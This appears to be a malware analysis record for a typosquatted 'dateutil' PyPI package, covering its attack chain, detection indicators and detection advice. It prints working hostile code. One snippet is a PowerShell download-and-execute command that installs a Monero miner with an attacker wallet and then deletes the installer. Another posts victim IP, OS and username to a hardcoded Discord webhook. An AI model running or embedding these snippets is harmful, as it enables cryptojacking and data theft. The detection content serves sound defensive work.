package_info.why_malicious: The package is a typosquat of the legitimate 'dateutil' library and contains code that, upon import, mines Monero cryptocurrency on the victim's system and exfiltrates AWS credentials and system information to an external Discord webhook. The malicious payload targets all major operating systems (Windows, Linux, macOS) and employs anti-forensic techniques to evade detection.

malicious_snippets.code_behavior: At import-time, the code uses subprocess to read the AWS credentials file and execute a remote shell script from raw.githubusercontent.com, which installs and runs a Monero cryptominer, resulting in credential exfiltration and unauthorized mining.

malice_analysis.why_suspicious: The code accesses sensitive AWS credentials and executes a remote shell script to install a cryptominer, both of which are clear indicators of malicious activity.
malice_analysis.violated_expectations: A date/time utility library should not access credential files or execute remote code via subprocess.
malice_analysis.similar_legitimate_use: No legitimate date/time utility should perform these actions; only specialized deployment or cloud tools might access credentials, but never to install cryptominers.
key_indicators: Execution of remote shell script via curl and bash
Installation and execution of Monero cryptominer
Use of subprocess.Popen with shell=True in __init__.py

malicious_snippets.code_snippet: system_info=subprocess.Popen("powershell -Command \"$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_monerocean_miner.bat', $tempfile); & $tempfile A7A6uVv7EZFDAKcnZkG1fNpRMDSbt0TzzWhf1LCiJ3Ki4H2S9jVCfnR5qkoVoA5De62wMqXUcSEz1Hgu7b1LnvBTpu; Remove-Item -Force $tempfile\"", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
malicious_snippets.code_behavior: At import-time on Windows, the code uses subprocess to invoke PowerShell, which downloads a remote batch file from raw.githubusercontent.com, executes it to install and run a Monero cryptominer, and then deletes the batch file to remove evidence.

malice_analysis.why_suspicious: Downloading and executing a remote batch file to install a cryptominer, followed by deletion of the script, is a strong indicator of malware with anti-forensic intent.
malice_analysis.violated_expectations: A utility library should not invoke PowerShell, download or execute external scripts, or attempt to hide its activity.
malice_analysis.similar_legitimate_use: Automated installers may download dependencies, but never cryptominers or perform anti-forensic deletion of scripts.
key_indicators: PowerShell invocation to download and execute remote code
Execution of cryptominer with attacker-supplied wallet address
Immediate deletion of batch file after execution

malicious_snippets.code_snippet: url = "https://discord.com/api/webhooks/991208558098141264/hlNnV1Qk9K3HE7P4hCpaZJ6nO5eLe4fU04GLIaT-7w4Jb0w3M4j1hzapbUJ8OjEuGzPA"; values = {'content': 'pwn4 zombY: '+str(ip)+' os: '+str(os_typ)+' content_ username: dateutils-pypi'}; requests.post(url, json=values)
malicious_snippets.code_behavior: At import-time, the code constructs a JSON payload containing the victim's IP address, OS type, and username, and sends it via HTTP POST to a hardcoded Discord webhook, resulting in exfiltration of system information to the attacker.

malice_analysis.why_suspicious: Exfiltrating system information to a hardcoded Discord webhook is a common tactic for malware to notify attackers of new infections and track victims.
malice_analysis.violated_expectations: A date/time utility should not collect or transmit system information to external services, especially not to Discord webhooks.
malice_analysis.similar_legitimate_use: Error reporting tools may send anonymized data to trusted endpoints, but not to Discord webhooks or with identifying system details.
key_indicators: Use of Discord webhook for exfiltration
Collection and transmission of IP address, OS type, and username

attack_chain.action: Upon import or installation, the package executes code to collect system information (IP address, OS type, username) and exfiltrate it to a Discord webhook.
attack_chain.leads_to: Attacker is notified of new infection and receives victim details.

attack_chain.action: The package accesses sensitive AWS credentials and exfiltrates them by reading the credentials file and sending its contents.
attack_chain.leads_to: Attacker gains access to victim's AWS credentials.

attack_chain.action: The package downloads and executes a remote cryptominer, tailored for the victim's operating system (Linux/macOS via shell script, Windows via batch file).
attack_chain.leads_to: Victim's system is used for unauthorized Monero mining.

attack_chain.action: On Windows, the package deletes the downloaded batch file after execution to evade detection and hinder forensic analysis.

behavioral_signatures: Import-time execution of subprocesses that access sensitive files or download and execute remote scripts
Network requests to Discord webhooks or other hardcoded URLs for exfiltration
Installation and execution of cryptomining software via shell or PowerShell
Immediate deletion of downloaded scripts after execution (anti-forensics)
file_indicators: ~/.aws/credentials file access from non-AWS-related Python packages
References to setup_monerocean_miner.sh or setup_monerocean_miner.bat in package files
Presence of subprocess.Popen or PowerShell invocation in __init__.py or similarly named files
network_indicators: HTTP POST requests to Discord webhooks (discord.com/api/webhooks/991208558098141264/hlNnV1Qk9K3HE7P4hCpaZJ6nO5eLe4fU04GLIaT-7w4Jb0w3M4j1hzapbUJ8OjEuGzPA)
detection_knowledge.how_to_detect: Monitor for Python packages that, upon import or installation, access sensitive files such as ~/.aws/credentials, spawn subprocesses to download and execute remote scripts (especially from raw.githubusercontent.com/MoneroOcean/xmrig_setup), or make network requests to Discord webhooks. Flag any package that performs these actions outside of expected contexts, particularly if the package name is a typosquat of a popular library. Automated scanning should also look for hardcoded wallet addresses, cryptominer setup scripts, and anti-forensic deletion of temporary files.
